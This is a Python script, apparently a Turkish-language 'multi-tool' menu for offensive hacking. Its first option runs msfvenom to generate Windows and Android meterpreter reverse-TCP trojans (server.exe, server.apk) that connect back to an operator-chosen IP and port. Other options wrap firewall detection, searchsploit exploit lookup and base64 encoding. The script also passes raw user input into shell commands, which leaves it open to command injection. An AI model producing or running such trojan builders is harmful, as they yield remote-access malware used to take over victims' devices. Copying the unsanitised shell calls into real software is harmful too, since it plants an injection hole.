from os import system, path, mkdir
from easyctf import yazdir, main1
import base64
import sys

class renkler:
    mavi = '\033[36m'
    sari = '\033[33m'
    yesil = '\033[32m'
    standart = '\033[39m'


r1 = renkler()
def mainmenu():
    temizle()
    dontworry()
    ghetto()

def temizle():
    system('clear')

def paketYukle(mint):
    system(f"apt install {mint}")

def dontworry():
    print(r1.mavi+'''

    ------------
    -- ghetto23 --
    ------------

    Multi-Tools v1

    01) Trojan Olusturma(Msfvenom)          04) SpeedTest
    02) Firewall Algilayici                 05) Kriptoloji
    03) Exploit Bulma                       06) CTF-Tools

    ''')

def ghetto():

    s3cim = int(input("Seciminizi Yapin: "))
    print(r1.standart)

    if s3cim == 1:
        temizle()
        print(r1.yesil+'''
01) Windows x64 (.exe) Reverse TCP
02) Windows x86 (.exe) Reverse TCP
03) Android Reverse TCP
99) Main Menu
        ''')

        trojan = int(input("> "))
        output_path = './trojan'

        lhost = input("IP Addressi Girin: ")
        lport = int(input("Port Numarasi Girin: "))

        if not path.exists('trojan'):
            mkdir('trojan')
        
        if trojan == 1:
            system(f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {output_path}/server.exe")
            temizle()
            print("Trojan Olusturuldu !")
        elif trojan == 2:
            system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {output_path}/server.exe")
            temizle()
            print("Trojan Olusturuldu !")   
        elif trojan == 3:
            system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {output_path}/server.apk")
            temizle()
            print("Trojan Olusturuldu !")
        elif trojan == 99:
            mainmenu()

        print(r1.standart)

    elif s3cim == 2:
        temizle()
        s1t3 = input("Firewall Bulunacak Site Linki: ")
        paketYukle('wafw00f')
        temizle()
        system(f'wafw00f {s1t3}')

    elif s3cim == 3:
        temizle()
        expl0it = input("Anahtar Kelimeniz: ")
        paketYukle('exploit-db')
        temizle()
        system('searchsploit {}'.format(expl0it))

    elif s3cim == 4:
        system('speedtest-cli')

    elif s3cim == 5:
        temizle()
        print(r1.sari+'''
Base64 Encode && Decode

01) Encode
02) Decode
99) Main Menu
    ''')

        dead123 = int(input("Seciminizi Yapin: "))

        if dead123 == 1:
            kelime = input("Kelimeni Base64'e Cevir: ")
            byt3s = kelime.encode('ascii')

            base64_bytes = base64.b64encode(byt3s)
            base64_string = base64_bytes.decode('ascii')

            print(f"Cevirildi: {base64_string}")
                
        elif dead123 == 2:
            basee64 = input("Base64'u Kelimeye Cevir: ")
            deaddd = basee64.encode('ascii')

            cevir0 = base64.b64decode(deaddd)
            submitt = cevir0.decode('ascii')

            print(f'Acar Kelime: {submitt}')

        elif dead123 == 99:
            mainmenu()

        print(r1.standart)

    elif s3cim == 6:
        yazdir()
        main1()

if __name__ == '__main__':
    dontworry()
    ghetto()